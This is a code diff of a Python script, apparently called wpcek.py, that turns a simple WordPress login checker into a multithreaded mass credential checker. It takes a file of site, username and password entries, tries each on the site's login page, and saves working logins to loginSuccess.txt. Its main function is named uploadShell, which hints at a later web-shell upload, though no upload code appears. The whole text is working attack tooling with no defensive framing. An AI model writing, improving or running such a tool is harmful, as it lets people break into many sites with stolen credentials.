@@ -1,43 +1,51 @@
+import sys
 import requests
+from multiprocessing.dummy import Pool as ThreadPool
 
-def check_wordpress_logins(file_path):
-    results = []
+G = '\033[0;32m'
+W = '\033[0;37m'
+R = '\033[0;31m'
+C = '\033[1;36m'
+
+def uploadShell(site):
+    asuna = site.replace('#', '|').replace('@', '|')
     try:
-        with open(file_path, 'r') as file:
-            lines = file.readlines()
-            for line in lines:
-                site, username, password = line.strip().split('|')
-                login_result = try_login(site, username, password)
-                results.append(login_result)
-    except Exception as e:
-        print(f"Error checking WordPress logins: {e}")
-    return '\n'.join(results)
-
-def try_login(site, username, password):
-    try:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-        }
-        session = requests.Session()
-        response = session.get(site, headers=headers, timeout=10)
-
-        if response.status_code == 200 or response.status_code == 403 or 'Powered by WordPress' in response.text or '/wp-login.php' in response.text:
-            login_data = {
-                'log': username,
-                'pwd': password
-            }
-            login_response = session.post(site, headers=headers, data=login_data, timeout=10)
-
-            if 'wp-admin/profile.php' in login_response.text or 'Found' in login_response.text or '/wp-admin' in login_response.text:
-                return f"{site}#{username}@{password} - Success"
+        site = asuna.split('|')[0]
+        user = asuna.split('|')[1]
+        pasw = asuna.split('|')[2]
+        hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.101 Safari/537.36'}
+        r = requests.Session()
+        cek = r.get(site, timeout=10)
+        if cek.status_code == 200 or cek.status_code == 403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
+            login = r.post(site, headers=hd, data={'log':user, 'pwd':pasw}, timeout=10)
+            if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
+                print(' {}[{}+{}] {} --> {}Login Success!{}'.format(W, G, W, asuna, G, W))
+                with open('loginSuccess.txt', 'a') as saveLog:
+                    saveLog.write(site + '#' + user + '@' + pasw + '\n')
             else:
-                return f"{site}#{username}@{password} - Failed"
+                print(' {}[{}-{}] {} --> {}Login Failed!{}'.format(W, R, W, asuna, R, W))
         else:
-            return f"{site}#{username}@{password} - Not a WordPress site or inaccessible"
+            print(' {}[{}-{}] {} --> {}Invalid Site!{}'.format(W, R, W, asuna, R, W))
     except Exception as e:
-        return f"{site}#{username}@{password} - Error: {str(e)}"
+        print('\n {}[{}-{}] {} --> {}Failed!{} ({})\n'.format(W, R, W, site, R, W, e))
+
+def main(filename, thread_count):
+    try:
+        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
+            sites = file.read().splitlines()
+        pool = ThreadPool(thread_count)
+        pool.map(uploadShell, sites)
+        pool.close()
+        pool.join()
+    except FileNotFoundError:
+        print(f'File {filename} tidak ditemukan.')
+    except ValueError:
+        print('Masukkan jumlah thread yang valid.')
+    except Exception as e:
+        print(f'Terjadi kesalahan: {e}')
 
 if __name__ == "__main__":
-    import sys
-    file_id = sys.argv[1]
-    print(check_wordpress_logins(file_id))
+    if len(sys.argv) != 3:
+        print("Usage: python wpcek.py <filename> <thread_count>")
+    else:
+        main(sys.argv[1], int(sys.argv[2]))
